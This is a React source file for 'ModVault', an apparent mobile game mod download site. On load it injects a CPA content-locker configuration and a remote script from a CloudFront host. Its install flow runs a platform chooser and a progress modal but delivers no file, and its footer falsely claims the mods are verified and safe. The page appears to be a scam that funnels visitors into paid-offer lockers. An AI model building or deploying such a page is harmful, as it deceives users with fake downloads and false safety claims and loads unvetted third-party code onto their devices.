
import React, { useState, useMemo, useCallback, useEffect } from 'react';
import Header from './components/Header';
import HeroCarousel from './components/HeroCarousel';
import GameCard from './components/GameCard';
import PlatformModal from './components/PlatformModal';
import ProgressModal from './components/ProgressModal';
import { GAMES_DATA } from './constants';
import { Game } from './types';

const App: React.FC = () => {
  const [searchQuery, setSearchQuery] = useState('');
  const [isViewAll, setIsViewAll] = useState(false);
  
  // Modal states
  const [selectedGame, setSelectedGame] = useState<Game | null>(null);
  const [activeModal, setActiveModal] = useState<'none' | 'platform' | 'progress'>('none');
  const [selectedPlatform, setSelectedPlatform] = useState<'android' | 'ios' | null>(null);

  useEffect(() => {
    // Inject CPA locker configuration
    if (!document.getElementById('locker-config')) {
      const configScript = document.createElement('script');
      configScript.id = 'locker-config';
      configScript.type = 'text/javascript';
      configScript.innerHTML = 'var VmjuC_kXp_tjyeec = {"it":4582121,"key":"14e54"};';
      document.body.appendChild(configScript);
    }
    // Inject CPA locker main script
    if (!document.getElementById('locker-main')) {
      const mainScript = document.createElement('script');
      mainScript.id = 'locker-main';
      mainScript.src = "https://duw03nk63ml3f.cloudfront.net/4ff83a9.js";
      document.body.appendChild(mainScript);
    }
  }, []);

  const filteredGames = useMemo(() => {
    const query = searchQuery.toLowerCase().trim();
    const baseList = query 
      ? GAMES_DATA.filter(game => game.title.toLowerCase().includes(query))
      : GAMES_DATA;

    // Implementation of data-level de-duplication
    const seen = new Set<string>();
    const uniqueGames = baseList.filter(g => {
      // De-duplicate by stable identifier: Prefer id, then normalized title
      const key = (g.id || g.title.toLowerCase().trim()).toString();
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });

    return uniqueGames;
  }, [searchQuery]);

  const toggleViewAll = () => {
    setIsViewAll(!isViewAll);
    if (!isViewAll) {
        window.scrollTo({ top: 400, behavior: 'smooth' });
    }
  };

  const handleInstallClick = useCallback((game: Game) => {
    setSelectedGame(game);
    setActiveModal('platform');
  }, []);

  const handlePlatformSelect = (platform: 'android' | 'ios') => {
    setSelectedPlatform(platform);
    setActiveModal('progress');
  };

  const handleDownloadContinue = (gameId: string, platform: 'android' | 'ios') => {
    console.log(`Download continued for game: ${gameId} on platform: ${platform}`);
    // Future redirect logic would go here
    setActiveModal('none');
    setSelectedGame(null);
    setSelectedPlatform(null);
  };

  const handleCloseModals = () => {
    setActiveModal('none');
    setSelectedGame(null);
    setSelectedPlatform(null);
  };

  return (
    <div className="min-h-screen max-w-screen-xl mx-auto flex flex-col pb-10">
      <Header searchQuery={searchQuery} setSearchQuery={setSearchQuery} />
      
      {!searchQuery && <HeroCarousel />}

      <main className="px-4 pt-4 flex-1">
        <div className="flex items-center justify-between mb-6">
          <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
            Trending Games
            {!searchQuery && (
                <span className="bg-red-500 text-[10px] px-1.5 py-0.5 rounded-sm uppercase">Hot</span>
            )}
          </h2>
          <button 
            onClick={toggleViewAll}
            className="text-blue-500 text-sm font-semibold hover:text-blue-400 transition-colors"
          >
            {isViewAll ? 'Show Featured' : 'View All'}
          </button>
        </div>

        {filteredGames.length > 0 ? (
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
            {filteredGames.map(game => (
              <GameCard 
                key={(game.id || game.title.toLowerCase().trim()).toString()} 
                game={game} 
                onInstall={handleInstallClick} 
              />
            ))}
          </div>
        ) : (
          <div className="flex flex-col items-center justify-center py-20 text-gray-500">
            <div className="bg-gray-900 p-6 rounded-full mb-4">
              <svg className="w-12 h-12 opacity-20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
            <p className="text-lg font-medium">No mods found for "{searchQuery}"</p>
            <button 
              onClick={() => setSearchQuery('')}
              className="mt-2 text-blue-500 underline"
            >
              Clear search
            </button>
          </div>
        )}
      </main>

      <footer className="mt-12 px-4 py-8 border-t border-gray-900 text-center">
        <div className="flex justify-center items-center gap-4 mb-4">
            <span className="w-12 h-[1px] bg-gray-800"></span>
            <span className="text-gray-600 font-bold tracking-widest text-xs uppercase italic">ModVault Premium</span>
            <span className="w-12 h-[1px] bg-gray-800"></span>
        </div>
        <p className="text-gray-500 text-[11px] max-w-xs mx-auto">
          © 2024 ModVault Gaming Store. All mod files are verified and safe for mobile deployment.
        </p>
      </footer>

      {/* Modal Flow */}
      {selectedGame && activeModal === 'platform' && (
        <PlatformModal 
          game={selectedGame} 
          onClose={handleCloseModals} 
          onSelect={handlePlatformSelect} 
        />
      )}

      {selectedGame && activeModal === 'progress' && selectedPlatform && (
        <ProgressModal 
          game={selectedGame} 
          platform={selectedPlatform} 
          onClose={handleCloseModals} 
          onContinue={handleDownloadContinue}
        />
      )}
    </div>
  );
};

export default App;
